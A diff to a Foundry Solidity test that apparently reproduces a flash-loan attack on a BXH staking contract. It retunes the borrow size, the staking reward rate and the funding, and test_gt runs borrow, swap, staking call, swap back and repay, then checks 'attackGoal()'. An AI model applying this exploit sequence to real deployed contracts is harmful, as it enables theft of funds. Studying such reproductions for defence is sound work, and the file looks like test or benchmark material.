@@ -61,16 +61,16 @@ contract BXHTest is Test, BlockLoader {
         router = new UniswapV2Router(address(factory), address(0xdead));
         bxhstaking = new BXHStaking(
             address(bxh),
-            10000000000000000000,
+            1 ether,
             21543000,
             1000,
             owner
         );
-        bxh.transfer(address(bxhstaking), 200000 ether);
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         bxh.transfer(address(pair), balanceOfbxhpair);
         usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
+        bxh.transfer(address(bxhstaking), balanceOfbxhbxhstaking);
         usdt.approve(attacker, UINT256_MAX);
         bxh.approve(attacker, UINT256_MAX);
         vm.stopPrank();
@@ -179,15 +179,15 @@ contract BXHTest is Test, BlockLoader {
     }
 
     function test_gt() public {
-        borrow_usdt(25000e18);
+        borrow_usdt(2500000e18);
         printBalance("After step0 ");
         swap_pair_usdt_bxh(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        transaction_bxhstaking_bxh(2400000 ether);
+        transaction_bxhstaking_bxh(10 ether);
         printBalance("After step2 ");
         swap_pair_bxh_usdt(bxh.balanceOf(attacker));
         printBalance("After step3 ");
-        payback_usdt((25000e18 * 1003) / 1000);
+        payback_usdt((2500000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
     }
